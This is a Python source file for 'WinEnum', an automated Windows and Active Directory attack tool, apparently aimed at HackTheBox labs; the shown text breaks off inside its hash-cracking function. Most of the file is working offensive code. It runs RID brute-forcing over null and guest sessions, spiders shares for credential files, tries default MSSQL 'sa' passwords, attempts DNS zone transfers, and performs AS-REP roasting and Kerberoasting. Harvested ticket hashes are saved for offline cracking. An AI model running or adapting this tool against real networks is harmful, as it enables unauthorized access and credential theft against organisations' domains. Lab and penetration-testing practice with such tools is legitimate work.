#!/usr/bin/env python3
"""
WinEnum - Windows HackTheBox Auto-Enumeration Tool
Author: VegeLasagne
Description: Automated enumeration of Windows services with credential testing
"""

import subprocess
import argparse
import sys
import re
import json
import os
import glob
from dataclasses import dataclass, field
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

# ANSI colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Thread-safe print lock
print_lock = Lock()

def print_banner():
    banner = f"""{Colors.CYAN}
██╗    ██╗██╗███╗   ██╗███████╗███╗   ██╗██╗   ██╗███╗   ███╗
██║    ██║██║████╗  ██║██╔════╝████╗  ██║██║   ██║████╗ ████║
██║ █╗ ██║██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
██║███╗██║██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
╚███╔███╔╝██║██║ ╚████║███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
{Colors.YELLOW}        Windows HackTheBox Auto-Enumeration Tool
{Colors.WHITE}                    by VegeLasagne{Colors.END}
"""
    print(banner)

@dataclass
class Target:
    ip: str
    username: Optional[str] = None
    password: Optional[str] = None
    domain: Optional[str] = None
    hash: Optional[str] = None
    
    def has_creds(self) -> bool:
        return bool(self.username and (self.password or self.hash))
    
    def cred_string(self) -> str:
        if not self.username:
            return "anonymous"
        domain = f"{self.domain}\\" if self.domain else ""
        return f"{domain}{self.username}"
    
    def netexec_auth(self) -> list:
        """Return netexec auth arguments"""
        cmd = []
        if self.domain:
            cmd.extend(['-d', self.domain])
        if self.username:
            cmd.extend(['-u', self.username])
            if self.hash:
                cmd.extend(['-H', self.hash])
            elif self.password:
                cmd.extend(['-p', self.password])
        return cmd
    
    def impacket_target(self) -> str:
        """Return impacket-style target string"""
        if self.domain:
            return f'{self.domain}/{self.username}'
        return self.username or ''

@dataclass
class ServiceResult:
    service: str
    port: int
    open: bool = False
    anonymous_access: bool = False
    guest_access: bool = False
    cred_access: bool = False
    details: dict = field(default_factory=dict)
    errors: list = field(default_factory=list)

class WinEnum:
    def __init__(self, target: Target, timeout: int = 10, verbose: bool = False, 
                 threads: int = 5, output_dir: str = None):
        self.target = target
        self.timeout = timeout
        self.verbose = verbose
        self.threads = threads
        self.output_dir = output_dir or os.path.join(os.getcwd(), 'winenum')
        self.results: dict[str, ServiceResult] = {}
        self.domain_users: list = []
        self.domain_info: dict = {}
        self.open_ports: dict = {}
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Service definitions with common ports
        self.services = {
            'smb': {'ports': [445, 139], 'name': 'SMB'},
            'ldap': {'ports': [389, 636, 3268, 3269], 'name': 'LDAP'},
            'kerberos': {'ports': [88], 'name': 'Kerberos'},
            'winrm': {'ports': [5985, 5986], 'name': 'WinRM'},
            'rdp': {'ports': [3389], 'name': 'RDP'},
            'mssql': {'ports': [1433], 'name': 'MSSQL'},
            'rpc': {'ports': [135], 'name': 'RPC/MSRPC'},
            'dns': {'ports': [53], 'name': 'DNS'},
            'ftp': {'ports': [21], 'name': 'FTP'},
            'ssh': {'ports': [22], 'name': 'SSH'},
            'http': {'ports': [80, 8080, 8000, 8443], 'name': 'HTTP'},
            'https': {'ports': [443], 'name': 'HTTPS'},
        }
    
    def run_command(self, cmd: list, timeout: int = None) -> tuple[int, str, str]:
        """Run a command and return exit code, stdout, stderr"""
        timeout = timeout or self.timeout
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Command timed out"
        except FileNotFoundError:
            return -2, "", f"Command not found: {cmd[0]}"
        except Exception as e:
            return -3, "", str(e)
    
    def print_status(self, message: str, status: str = "info"):
        """Thread-safe print formatted status message"""
        icons = {
            'info': f'{Colors.BLUE}[*]{Colors.END}',
            'success': f'{Colors.GREEN}[+]{Colors.END}',
            'warning': f'{Colors.YELLOW}[!]{Colors.END}',
            'error': f'{Colors.RED}[-]{Colors.END}',
            'finding': f'{Colors.PURPLE}[★]{Colors.END}',
        }
        with print_lock:
            print(f"{icons.get(status, icons['info'])} {message}")
    
    def print_header(self, title: str):
        """Print section header"""
        with print_lock:
            print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}")
            print(f" {title}")
            print(f"{'='*60}{Colors.END}")
    
    def save_to_file(self, filename: str, content: str, mode: str = 'w'):
        """Save content to output directory"""
        filepath = os.path.join(self.output_dir, filename)
        with open(filepath, mode) as f:
            f.write(content)
        return filepath
    
    def save_hash(self, hash_str: str, hash_type: str):
        """Save hash to file for cracking"""
        filepath = self.save_to_file(f'{hash_type}_hashes.txt', hash_str + '\n', 'a')
        self.print_status(f"  Hash saved to {filepath}", "info")
    
    # ==================== Port Scanning ====================
    
    def scan_ports(self) -> dict[int, bool]:
        """Quick port scan using nmap"""
        self.print_header("PORT SCAN")
        
        all_ports = set()
        for svc in self.services.values():
            all_ports.update(svc['ports'])
        
        ports_str = ','.join(map(str, sorted(all_ports)))
        open_ports = {}
        
        self.print_status(f"Scanning {self.target.ip} for common Windows ports...")
        
        cmd = ['nmap', '-Pn', '-sT', '--open', '-T4', '-p', ports_str, self.target.ip]
        code, stdout, stderr = self.run_command(cmd, timeout=60)
        
        if code == 0:
            for line in stdout.split('\n'):
                match = re.search(r'(\d+)/tcp\s+open', line)
                if match:
                    port = int(match.group(1))
                    open_ports[port] = True
                    self.print_status(f"Port {port}/tcp is open", "success")
        else:
            # Fallback to netcat-based scanning
            self.print_status("nmap failed, using netcat fallback...", "warning")
            for port in sorted(all_ports):
                cmd = ['nc', '-zv', '-w', '2', self.target.ip, str(port)]
                code, _, _ = self.run_command(cmd, timeout=5)
                if code == 0:
                    open_ports[port] = True
                    self.print_status(f"Port {port}/tcp is open", "success")
        
        if not open_ports:
            self.print_status("No open ports found (host may be down or filtered)", "warning")
        
        self.open_ports = open_ports
        return open_ports
    
    # ==================== Domain Discovery ====================
    
    def discover_domain(self):
        """Auto-discover domain name from various sources"""
        if self.target.domain:
            self.print_status(f"Domain provided: {self.target.domain}", "info")
            return
        
        self.print_header("DOMAIN DISCOVERY")
        
        # Try netexec SMB first
        if 445 in self.open_ports:
            cmd = ['netexec', 'smb', self.target.ip]
            code, stdout, stderr = self.run_command(cmd)
            
            # Parse domain from output like: SMB 10.10.10.100 445 DC01 [*] Windows Server... (domain:MEGACORP)
            domain_match = re.search(r'\(domain:([^\)]+)\)', stdout)
            if domain_match:
                self.target.domain = domain_match.group(1)
                self.print_status(f"Discovered domain: {self.target.domain}", "finding")
                return
            
            # Also try name: pattern
            name_match = re.search(r'\(name:([^\)]+)\)', stdout)
            if name_match:
                self.domain_info['hostname'] = name_match.group(1)
                self.print_status(f"Hostname: {self.domain_info['hostname']}", "info")
        
        # Try LDAP
        if 389 in self.open_ports:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{self.target.ip}', 
                   '-s', 'base', 'namingContexts']
            code, stdout, stderr = self.run_command(cmd)
            
            if code == 0:
                # Extract DC components
                dc_match = re.search(r'DC=([^,]+),DC=([^,\s]+)', stdout)
                if dc_match:
                    self.target.domain = f"{dc_match.group(1)}.{dc_match.group(2)}"
                    self.print_status(f"Discovered domain from LDAP: {self.target.domain}", "finding")
                    return
        
        self.print_status("Could not auto-discover domain. Use -d to specify.", "warning")
    
    # ==================== RID Brute Force ====================
    
    def rid_brute(self) -> list:
        """Enumerate users via RID cycling"""
        self.print_header("RID BRUTE FORCE (User Enumeration)")
        
        users = []
        
        if 445 not in self.open_ports:
            self.print_status("SMB not available for RID brute", "warning")
            return users
        
        # If we have creds, use them first
        if self.target.has_creds():
            cmd = ['netexec', 'smb', self.target.ip, '--rid-brute', '5000']
            cmd.extend(self.target.netexec_auth())
            self.print_status(f"RID brute with credentials: {self.target.cred_string()} (this may take a minute)...", "info")
            
            code, stdout, stderr = self.run_command(cmd, timeout=60)
            
            if code == 0:
                for line in stdout.split('\n'):
                    if 'SidTypeUser' in line:
                        user_match = re.search(r'\\([^\s\(]+)', line)
                        if user_match:
                            username = user_match.group(1)
                            if username not in users and username != '':
                                users.append(username)
        
        # If no creds provided, try multiple anonymous methods
        # Guest and anonymous often work when true NULL session doesn't
        if not users and not self.target.has_creds():
            auth_methods = [
                (['-u', 'guest', '-p', ''], 'GUEST'),
                (['-u', 'anonymous', '-p', ''], 'ANONYMOUS'),  
                (['-u', '', '-p', ''], 'NULL'),
            ]
            
            for auth_args, method_name in auth_methods:
                self.print_status(f"RID brute with {method_name} session...", "info")
                
                cmd = ['netexec', 'smb', self.target.ip, '--rid-brute', '5000'] + auth_args
                code, stdout, stderr = self.run_command(cmd, timeout=60)
                
                if code == 0 and 'SidTypeUser' in stdout:
                    for line in stdout.split('\n'):
                        if 'SidTypeUser' in line:
                            user_match = re.search(r'\\([^\s\(]+)', line)
                            if user_match:
                                username = user_match.group(1)
                                if username not in users and username != '':
                                    users.append(username)
                    
                    if users:
                        self.print_status(f"Success with {method_name} session!", "finding")
                        break
                else:
                    if self.verbose:
                        self.print_status(f"{method_name} session failed or returned no users", "info")
        
        if users:
            self.print_status(f"Found {len(users)} users via RID brute!", "finding")
            for u in users[:10]:
                self.print_status(f"  → {u}", "success")
            if len(users) > 10:
                self.print_status(f"  ... and {len(users) - 10} more", "info")
            
            filepath = self.save_to_file('domain_users.txt', '\n'.join(users))
            self.print_status(f"Users saved to {filepath}", "info")
        else:
            self.print_status("No users found via RID brute", "info")
        
        self.domain_users = users
        return users
    
    # ==================== SMB Enumeration ====================
    
    def enum_smb(self) -> ServiceResult:
        """Enumerate SMB service"""
        result = ServiceResult(service='smb', port=445)
        
        if 445 not in self.open_ports and 139 not in self.open_ports:
            return result
        
        result.open = True
        self.print_header("SMB ENUMERATION")
        
        self._smb_get_info(result)
        
        if self.target.has_creds():
            self.print_status(f"Skipping NULL/guest (creds provided)")
            self.print_status(f"Testing credentials: {self.target.cred_string()}...")
            if self._smb_test_auth(result, self.target.username, 
                                   self.target.password or '', 'cred',
                                   self.target.hash):
                result.cred_access = True
        else:
            self.print_status("Testing NULL session...")
            if self._smb_test_auth(result, '', '', 'null'):
                result.anonymous_access = True
            
            self.print_status("Testing GUEST session...")
            if self._smb_test_auth(result, 'guest', '', 'guest'):
                result.guest_access = True
        
        return result
    
    def _smb_test_auth(self, result: ServiceResult, user: str, password: str, 
                       auth_type: str, ntlm_hash: str = None) -> bool:
        """Test SMB authentication and enumerate shares"""
        cmd = ['netexec', 'smb', self.target.ip]
        
        if self.target.domain and auth_type == 'cred':
            cmd.extend(['-d', self.target.domain])
        
        cmd.extend(['-u', user])
        
        if ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        else:
            cmd.extend(['-p', password])
        
        code, stdout, stderr = self.run_command(cmd)
        
        if '[+]' in stdout:
            is_admin = 'Pwn3d!' in stdout
            if is_admin:
                self.print_status(f"ADMIN ACCESS with {auth_type}!", "finding")
                result.details['admin_access'] = True
            else:
                self.print_status(f"{auth_type.upper()} session allowed!", "finding" if auth_type != 'cred' else "success")
            
            self._smb_enum_shares(result, user, password, auth_type, ntlm_hash)
            return True
        
        return False
    
    def _smb_enum_shares(self, result: ServiceResult, user: str, password: str,
                         auth_type: str, ntlm_hash: str = None):
        """Enumerate and spider SMB shares"""
        cmd = ['netexec', 'smb', self.target.ip, '--shares']
        
        if self.target.domain and auth_type == 'cred':
            cmd.extend(['-d', self.target.domain])
        
        cmd.extend(['-u', user])
        
        if ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        else:
            cmd.extend(['-p', password])
        
        code, stdout, stderr = self.run_command(cmd)
        
        shares = []
        for line in stdout.split('\n'):
            if 'READ' in line or 'WRITE' in line:
                parts = line.strip().split()
                for i, part in enumerate(parts):
                    if part in ['READ', 'WRITE', 'READ,WRITE']:
                        share_name = parts[i-1] if i > 0 else 'Unknown'
                        permissions = part
                        shares.append({'name': share_name, 'access': permissions, 'files': []})
                        access_color = Colors.GREEN if 'WRITE' in permissions else Colors.YELLOW
                        self.print_status(
                            f"  Share: {Colors.BOLD}{share_name}{Colors.END} "
                            f"[{access_color}{permissions}{Colors.END}]", 
                            "success"
                        )
                        break
        
        result.details[f'shares_{auth_type}'] = shares
        
        interesting_shares = [s for s in shares if s['name'].upper() not in 
                             ['IPC$', 'PRINT$', 'C$', 'ADMIN$']]
        
        if interesting_shares:
            self.print_status(f"Spidering {len(interesting_shares)} accessible share(s)...", "info")
            for share in interesting_shares:
                self._smb_spider_share(result, share, user, password, auth_type, ntlm_hash)
    
    def _smb_spider_share(self, result: ServiceResult, share: dict, user: str, 
                          password: str, auth_type: str, ntlm_hash: str = None):
        """Spider a single SMB share for interesting files"""
        share_name = share['name']
        
        if ntlm_hash:
            cmd = ['smbclient', f'//{self.target.ip}/{share_name}', 
                   '-U', f'{user}%', '--pw-nt-hash', ntlm_hash.split(':')[-1],
                   '-c', 'recurse ON; ls']
        elif user:
            cmd = ['smbclient', f'//{self.target.ip}/{share_name}',
                   '-U', f'{user}%{password}', '-c', 'recurse ON; ls']
        else:
            cmd = ['smbclient', f'//{self.target.ip}/{share_name}',
                   '-N', '-c', 'recurse ON; ls']
        
        code, stdout, stderr = self.run_command(cmd, timeout=30)
        
        interesting_extensions = ['.txt', '.xml', '.ini', '.config', '.conf', '.cfg',
                                  '.ps1', '.bat', '.cmd', '.vbs', '.kdbx', '.key',
                                  '.pem', '.pfx', '.p12', '.crt', '.cer', '.doc',
                                  '.docx', '.xls', '.xlsx', '.pdf', '.bak', '.old',
                                  '.sql', '.mdb', '.accdb']
        interesting_names = ['password', 'passwd', 'cred', 'secret', 'private',
                            'backup', 'config', 'web.config', 'unattend', 'sysprep']
        
        files_found = []
        if code == 0:
            for line in stdout.split('\n'):
                line_lower = line.lower()
                for ext in interesting_extensions:
                    if ext in line_lower:
                        files_found.append(line.strip())
                        break
                else:
                    for name in interesting_names:
                        if name in line_lower:
                            files_found.append(line.strip())
                            break
        
        if files_found:
            self.print_status(f"  Interesting files in {share_name}:", "finding")
            share['files'] = files_found[:20]
            for f in files_found[:10]:
                self.print_status(f"    → {f}", "success")
            if len(files_found) > 10:
                self.print_status(f"    ... and {len(files_found) - 10} more", "info")
    
    def _smb_get_info(self, result: ServiceResult):
        """Get SMB signing and version info"""
        cmd = ['netexec', 'smb', self.target.ip]
        code, stdout, stderr = self.run_command(cmd)
        
        for line in stdout.split('\n'):
            if 'signing:' in line.lower():
                if 'False' in line:
                    result.details['signing_required'] = False
                    self.print_status("SMB Signing: NOT required (relay possible!)", "finding")
                else:
                    result.details['signing_required'] = True
                    self.print_status("SMB Signing: Required", "info")
            
            if 'Windows' in line or 'Samba' in line:
                match = re.search(r'(Windows[^)]+|Samba[^\]]+)', line)
                if match:
                    result.details['os_info'] = match.group(1)
                    self.print_status(f"OS: {match.group(1)}", "info")
    
    # ==================== LDAP Enumeration ====================
    
    def enum_ldap(self) -> ServiceResult:
        """Enumerate LDAP service"""
        result = ServiceResult(service='ldap', port=389)
        
        if 389 not in self.open_ports and 636 not in self.open_ports:
            return result
        
        result.open = True
        self.print_header("LDAP ENUMERATION")
        
        if self.target.has_creds():
            self.print_status(f"Skipping anonymous bind (creds provided)")
            self.print_status(f"Testing LDAP with credentials...")
            if self._ldap_authenticated(result):
                result.cred_access = True
                self._ldap_domain_dump(result)
        else:
            self.print_status("Testing anonymous LDAP bind...")
            if self._ldap_anonymous(result):
                result.anonymous_access = True
        
        return result
    
    def _ldap_anonymous(self, result: ServiceResult) -> bool:
        """Test anonymous LDAP access"""
        cmd = ['ldapsearch', '-x', '-H', f'ldap://{self.target.ip}', 
               '-s', 'base', 'namingContexts']
        code, stdout, stderr = self.run_command(cmd)
        
        if code == 0 and 'namingContexts' in stdout:
            self.print_status("Anonymous LDAP bind allowed!", "finding")
            
            contexts = re.findall(r'namingContexts:\s*(.+)', stdout)
            if contexts:
                result.details['naming_contexts'] = contexts
                for ctx in contexts:
                    self.print_status(f"  Naming Context: {ctx}", "success")
                    if 'DC=' in ctx:
                        result.details['domain_dn'] = ctx
            return True
        
        return False
    
    def _ldap_authenticated(self, result: ServiceResult) -> bool:
        """Test LDAP with credentials"""
        cmd = ['netexec', 'ldap', self.target.ip]
        cmd.extend(self.target.netexec_auth())
        
        code, stdout, stderr = self.run_command(cmd)
        
        if '[+]' in stdout:
            self.print_status(f"LDAP authentication successful", "success")
            return True
        return False
    
    def _ldap_domain_dump(self, result: ServiceResult):
        """Dump domain info using ldapdomaindump"""
        self.print_status("Running ldapdomaindump...", "info")
        
        dump_dir = os.path.join(self.output_dir, 'ldapdump')
        os.makedirs(dump_dir, exist_ok=True)
        
        if self.target.domain:
            user = f'{self.target.domain}\\{self.target.username}'
        else:
            user = self.target.username
        
        cmd = ['/usr/bin/ldapdomaindump', '-u', user, '-o', dump_dir]
        
        if self.target.hash:
            cmd.extend(['-p', self.target.hash, '--authtype', 'NTLM'])
        else:
            cmd.extend(['-p', self.target.password])
        
        cmd.append(f'ldap://{self.target.ip}')
        
        code, stdout, stderr = self.run_command(cmd, timeout=120)
        
        if code == 0:
            html_files = glob.glob(f'{dump_dir}/*.html')
            if html_files:
                self.print_status(f"LDAP dump complete! Files in {dump_dir}", "finding")
                result.details['ldapdump_dir'] = dump_dir
                for f in html_files[:5]:
                    self.print_status(f"  → {os.path.basename(f)}", "success")
            else:
                self.print_status("ldapdomaindump completed but no output", "warning")
        else:
            if self.verbose:
                self.print_status(f"ldapdomaindump failed: {stderr}", "error")
    
    # ==================== Kerberos Services ====================
    
    def enum_kerberos(self) -> ServiceResult:
        """Enumerate Kerberos service"""
        result = ServiceResult(service='kerberos', port=88)
        
        if 88 not in self.open_ports:
            return result
        
        result.open = True
        self.print_header("KERBEROS ENUMERATION")
        
        self.print_status("Kerberos service detected", "success")
        
        if self.target.domain:
            self.print_status(f"Domain: {self.target.domain}", "info")
        
        return result
    
    # ==================== AS-REP Roasting ====================
    
    def asrep_roast(self) -> ServiceResult:
        """AS-REP roast users without pre-authentication"""
        result = ServiceResult(service='asrep', port=88)
        
        if 88 not in self.open_ports:
            return result
        
        if not self.target.domain:
            return result
        
        result.open = True
        self.print_header("AS-REP ROASTING")
        
        hashes_found = []
        
        if self.target.has_creds():
            self.print_status("Querying for AS-REP roastable users...", "info")
            
            cmd = ['impacket-GetNPUsers', self.target.impacket_target(),
                   '-dc-ip', self.target.ip, '-request']
            
            if self.target.hash:
                cmd.extend(['-hashes', f':{self.target.hash}'])
            else:
                cmd.extend(['-p', self.target.password])
            
            code, stdout, stderr = self.run_command(cmd, timeout=60)
            
            hashes = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
            hashes_found.extend(hashes)
        
        if self.domain_users:
            self.print_status(f"Testing {len(self.domain_users)} enumerated users...", "info")
            
            userfile = os.path.join(self.output_dir, 'users_asrep.txt')
            with open(userfile, 'w') as f:
                f.write('\n'.join(self.domain_users))
            
            cmd = ['impacket-GetNPUsers', f'{self.target.domain}/',
                   '-no-pass', '-usersfile', userfile, '-dc-ip', self.target.ip]
            
            code, stdout, stderr = self.run_command(cmd, timeout=120)
            
            hashes = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
            hashes_found.extend(hashes)
        
        hashes_found = list(set(hashes_found))
        
        if hashes_found:
            self.print_status(f"Found {len(hashes_found)} AS-REP roastable user(s)!", "finding")
            result.anonymous_access = True
            result.details['asrep_hashes'] = hashes_found
            
            for h in hashes_found:
                user_match = re.search(r'\$krb5asrep\$\d+\$([^@]+)@', h)
                if user_match:
                    self.print_status(f"  → {user_match.group(1)}", "success")
                self.save_hash(h, 'asrep')
            
            # Save to unified hashes file
            for h in hashes_found:
                self.save_to_file('hashes', h + '\n', 'a')
            
            self.print_status(f"AS-REP hashes saved to {self.output_dir}/hashes", "info")
        else:
            self.print_status("No AS-REP roastable users found", "info")
        
        return result
    
    # ==================== Kerberoasting ====================
    
    def kerberoast(self) -> ServiceResult:
        """Kerberoast service accounts"""
        result = ServiceResult(service='kerberoast', port=88)
        
        if 88 not in self.open_ports:
            return result
        
        if not self.target.has_creds() or not self.target.domain:
            self.print_status("Credentials and domain required for Kerberoasting", "warning")
            return result
        
        result.open = True
        self.print_header("KERBEROASTING")
        
        self.print_status(f"Requesting service tickets...", "info")
        
        cmd = ['impacket-GetUserSPNs', self.target.impacket_target(),
               '-dc-ip', self.target.ip, '-request']
        
        if self.target.hash:
            cmd.extend(['-hashes', f':{self.target.hash}'])
        else:
            cmd.extend(['-p', self.target.password])
        
        code, stdout, stderr = self.run_command(cmd, timeout=60)
        
        hashes = re.findall(r'\$krb5tgs\$[^\s]+', stdout)
        
        if hashes:
            self.print_status(f"Found {len(hashes)} Kerberoastable service account(s)!", "finding")
            result.cred_access = True
            result.details['kerberoast_hashes'] = hashes
            
            spn_info = re.findall(r'(\S+/\S+)\s+(\S+)\s+\d{4}-', stdout)
            for spn, user in spn_info:
                self.print_status(f"  → {user} ({spn})", "success")
            
            for h in hashes:
                self.save_hash(h, 'kerberoast')
            
            # Save to unified hashes file
            for h in hashes:
                self.save_to_file('hashes', h + '\n', 'a')
            
            self.print_status(f"Kerberoast hashes saved to {self.output_dir}/hashes", "info")
        else:
            self.print_status("No Kerberoastable accounts found", "info")
            
            if 'ServicePrincipalName' in stdout:
                self.print_status("Service accounts exist but no TGS obtained", "warning")
        
        return result
    
    # ==================== BloodHound Collection ====================
    
    def collect_bloodhound(self) -> ServiceResult:
        """Collect BloodHound data"""
        result = ServiceResult(service='bloodhound', port=389)
        
        if 389 not in self.open_ports and 636 not in self.open_ports:
            return result
        
        if not self.target.has_creds() or not self.target.domain:
            return result
        
        result.open = True
        self.print_header("BLOODHOUND COLLECTION")
        
        self.print_status("Attempting collection with RustHound (+ADCS)...", "info")
        if self._collect_rusthound(result):
            result.cred_access = True
            return result
        
        self.print_status("RustHound failed, trying BloodHound.py...", "warning")
        if self._collect_bloodhound_py(result):
            result.cred_access = True
        
        return result
    
    def _collect_rusthound(self, result: ServiceResult) -> bool:
        """Collect using rusthound"""
        bh_dir = os.path.join(self.output_dir, 'bloodhound')
        os.makedirs(bh_dir, exist_ok=True)
        
        if self.target.hash:
            self.print_status("RustHound doesn't support hash auth", "info")
            return False
        
        cmd = ['rusthound',
               '-d', self.target.domain,
               '-i', self.target.ip,
               '-u', f'{self.target.username}@{self.target.domain}',
               '-p', self.target.password,
               '-o', bh_dir,
               '-z',
               '--adcs']
        
        code, stdout, stderr = self.run_command(cmd, timeout=180)
        
        if code == 0:
            zip_files = glob.glob(f'{bh_dir}/*.zip')
            if zip_files:
                self.print_status(f"BloodHound data collected!", "finding")
                result.details['bloodhound_zip'] = zip_files[0]
                self.print_status(f"  → {zip_files[0]}", "success")
                
                if 'adcs' in stdout.lower() or 'certificate' in stdout.lower():
                    result.details['adcs_collected'] = True
                    self.print_status("  → ADCS data included", "success")
                return True
        
        if self.verbose:
            self.print_status(f"RustHound error: {stderr}", "error")
        return False
    
    def _collect_bloodhound_py(self, result: ServiceResult) -> bool:
        """Collect using bloodhound-python"""
        bh_dir = os.path.join(self.output_dir, 'bloodhound')
        os.makedirs(bh_dir, exist_ok=True)
        
        cmd = ['bloodhound-python',
               '-d', self.target.domain,
               '-u', self.target.username,
               '-dc', self.target.ip,
               '-ns', self.target.ip,
               '-c', 'All',
               '--zip']
        
        if self.target.hash:
            cmd.extend(['--hashes', f':{self.target.hash}'])
        else:
            cmd.extend(['-p', self.target.password])
        
        original_dir = os.getcwd()
        os.chdir(bh_dir)
        
        code, stdout, stderr = self.run_command(cmd, timeout=300)
        
        os.chdir(original_dir)
        
        if code == 0:
            zip_files = glob.glob(f'{bh_dir}/*.zip')
            if zip_files:
                self.print_status(f"BloodHound data collected!", "finding")
                result.details['bloodhound_zip'] = zip_files[0]
                self.print_status(f"  → {zip_files[0]}", "success")
                return True
        
        self.print_status("BloodHound collection failed", "error")
        return False
    
    # ==================== WinRM Enumeration ====================
    
    def enum_winrm(self) -> ServiceResult:
        """Enumerate WinRM service"""
        result = ServiceResult(service='winrm', port=5985)
        
        if 5985 not in self.open_ports and 5986 not in self.open_ports:
            return result
        
        result.open = True
        result.port = 5985 if 5985 in self.open_ports else 5986
        self.print_header("WINRM ENUMERATION")
        
        self.print_status(f"WinRM detected on port {result.port}", "success")
        
        if self.target.has_creds():
            cmd = ['netexec', 'winrm', self.target.ip]
            cmd.extend(self.target.netexec_auth())
            
            code, stdout, stderr = self.run_command(cmd)
            
            if '[+]' in stdout:
                if 'Pwn3d!' in stdout:
                    self.print_status("WinRM ACCESS - Can get shell!", "finding")
                    result.details['can_psremote'] = True
                else:
                    self.print_status("WinRM auth works (may need local admin)", "success")
                result.cred_access = True
        
        return result
    
    # ==================== RDP Enumeration ====================
    
    def enum_rdp(self) -> ServiceResult:
        """Enumerate RDP service"""
        result = ServiceResult(service='rdp', port=3389)
        
        if 3389 not in self.open_ports:
            return result
        
        result.open = True
        self.print_header("RDP ENUMERATION")
        
        self.print_status("RDP service detected", "success")
        
        cmd = ['netexec', 'rdp', self.target.ip]
        code, stdout, stderr = self.run_command(cmd)
        
        if 'NLA' in stdout:
            if 'True' in stdout.split('NLA')[1][:20]:
                result.details['nla_required'] = True
                self.print_status("NLA required", "info")
            else:
                result.details['nla_required'] = False
                self.print_status("NLA NOT required - check BlueKeep!", "finding")
        
        if self.target.has_creds():
            cmd = ['netexec', 'rdp', self.target.ip]
            cmd.extend(self.target.netexec_auth())
            
            code, stdout, stderr = self.run_command(cmd)
            
            if '[+]' in stdout:
                self.print_status("RDP authentication successful!", "finding")
                result.cred_access = True
        
        return result
    
    # ==================== MSSQL Enumeration ====================
    
    def enum_mssql(self) -> ServiceResult:
        """Enumerate MSSQL service"""
        result = ServiceResult(service='mssql', port=1433)
        
        if 1433 not in self.open_ports:
            return result
        
        result.open = True
        self.print_header("MSSQL ENUMERATION")
        
        self.print_status("MSSQL service detected", "success")
        
        if self.target.has_creds():
            self.print_status("Skipping default cred tests (creds provided)")
            cmd = ['netexec', 'mssql', self.target.ip]
            cmd.extend(self.target.netexec_auth())
            
            code, stdout, stderr = self.run_command(cmd)
            
            if '[+]' in stdout:
                if 'Pwn3d!' in stdout or 'admin' in stdout.lower():
                    self.print_status("MSSQL ADMIN access!", "finding")
                    result.details['is_admin'] = True
                else:
                    self.print_status("MSSQL authentication successful", "success")
                result.cred_access = True
        else:
            default_creds = [('sa', ''), ('sa', 'sa'), ('sa', 'password')]
            
            for user, passwd in default_creds:
                cmd = ['netexec', 'mssql', self.target.ip, '-u', user, '-p', passwd]
                code, stdout, stderr = self.run_command(cmd, timeout=5)
                
                if '[+]' in stdout:
                    self.print_status(f"Default creds work: {user}:{passwd}", "finding")
                    result.details['default_creds'] = f"{user}:{passwd}"
                    result.anonymous_access = True
                    break
        
        return result
    
    # ==================== DNS Enumeration ====================
    
    def enum_dns(self) -> ServiceResult:
        """Enumerate DNS service"""
        result = ServiceResult(service='dns', port=53)
        
        if 53 not in self.open_ports:
            return result
        
        result.open = True
        self.print_header("DNS ENUMERATION")
        
        self.print_status("DNS service detected", "success")
        
        if self.target.domain:
            self.print_status(f"Attempting zone transfer for {self.target.domain}...", "info")
            cmd = ['dig', 'axfr', self.target.domain, f'@{self.target.ip}']
            code, stdout, stderr = self.run_command(cmd)
            
            if code == 0 and 'XFR' in stdout and 'Transfer failed' not in stdout:
                self.print_status("Zone transfer successful!", "finding")
                result.anonymous_access = True
                result.details['zone_transfer'] = True
                
                filepath = self.save_to_file('zone_transfer.txt', stdout)
                self.print_status(f"  → Saved to {filepath}", "success")
        
        return result
    
    # ==================== HTTP Enumeration ====================
    
    def enum_http(self) -> ServiceResult:
        """Enumerate HTTP service"""
        result = ServiceResult(service='http', port=80)
        
        http_ports = [p for p in [80, 8080, 8000, 443, 8443] if p in self.open_ports]
        if not http_ports:
            return result
        
        result.open = True
        result.port = http_ports[0]
        self.print_header("HTTP ENUMERATION")
        
        for port in http_ports:
            scheme = 'https' if port in [443, 8443] else 'http'
            url = f"{scheme}://{self.target.ip}:{port}"
            
            self.print_status(f"Checking {url}...", "info")
            
            cmd = ['curl', '-s', '-I', '-k', '-m', '5', url]
            code, stdout, stderr = self.run_command(cmd)
            
            if code == 0:
                server_match = re.search(r'Server:\s*(.+)', stdout, re.IGNORECASE)
                if server_match:
                    result.details[f'server_{port}'] = server_match.group(1).strip()
                    self.print_status(f"  Server: {server_match.group(1).strip()}", "info")
                
                if 'WWW-Authenticate' in stdout:
                    self.print_status(f"  Authentication required", "info")
        
        return result
    
    # ==================== Hash Cracking ====================
    
    def crack_hashes(self):
        """Attempt to crack collected hashes with hashcat and rockyou.txt"""
        hashes_file = os.path.join(self.output_dir, 'hashes')
        wordlist = '/usr/share/wordlists/rockyou.txt'
        cracked_file = os.path.join(self.output_dir, 'cracked.txt')
        
        if not os.path.exists(hashes_file) or os.path.getsize(hashes_file) == 0:
            self.print_status("No hashes collected, skipping crack phase", "info")
            return
        
        if not os.path.exists(wordlist):
            self.print_status(f"Wordlist not found: {wordlist}", "warning")
            return
        
        self.print_header("HASH CRACKING")
        
        # Hash modes to try: AS-REP (18200) and Kerberoast (13100)
        hash_modes = [
            (18200, 'AS-REP ($krb5asrep)'),
            (13100, 'Kerberoast ($krb5tgs)'),
        ]
        
        all_cracked = []
        
